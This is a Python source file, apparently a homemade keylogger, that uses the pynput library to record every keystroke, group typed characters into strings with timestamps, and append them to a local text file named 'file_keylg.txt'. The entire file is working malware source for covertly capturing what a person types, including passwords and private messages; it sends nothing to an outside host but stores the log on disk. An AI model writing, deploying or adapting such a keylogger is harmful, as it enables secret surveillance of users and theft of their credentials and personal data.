from pynput.keyboard import Key, Listener
import logging, time
import datetime
global data
global count
count = 0
data = ''
#log_dir = "" 

# logging.basicConfig(filename=(log_dir + "log_k.txt"), level=logging.DEBUG,format='%(asctime)s :%(message)s') 
# logging.basicConfig(filename=(log_dir + "log_k.txt"), level=logging.DEBUG,format='%(asctime)s :%(message)s') 
previus_time = 0
lst=[]

def save_data(data):
    with open('file_keylg.txt','at') as f:
        f.write(data+'\n')

def on_press(key):
    #print(type(key))
    global lst
    if len(str(key)) > 3:
        a = str(key)+'pressed'
        #print(type(a),a)
        lst.append(a)
        #print('{0} pressed'.format(key)) 

def on_release(key):                                              
        global data,previus_time,lst,count
        settime =3.33
        if len(lst)>0:
            if 'pressed' in lst[0]:
                key = lst[0].strip('pressed')+' '+str(key)
                a,b =key.split(' ')
                if a==b:
                    key = a
                #print('----',key)
                count =1
                lst=[]
        if count ==2:
            key =''
            count=0
    
        if len(str(key)) <=3 and len(str(key)) !=0:
                data = data+str(key)[1]
                print(data, key)
        elif len(str(key)) >3:
                if 'spac' in str(key) and len(data) != 0:
                        data = data+' '
                else:   
                        if (time.time()) > previus_time+settime:
                                print('--------------------------')
                                print('time:',(settime+time.time()),'previus_time',previus_time)
                                data = str(datetime.datetime.now()) +'\n--------------------------\n'+str(data)
                        data = str(data)+'\n__'+str(key)
                        print('>>>>',data)
                        save_data(data)
                        if count==1:
                            count=2
                        data = ''
                        previus_time = time.time()
with Listener(on_press=on_press,on_release=on_release) as listener:
        listener: listener.join()
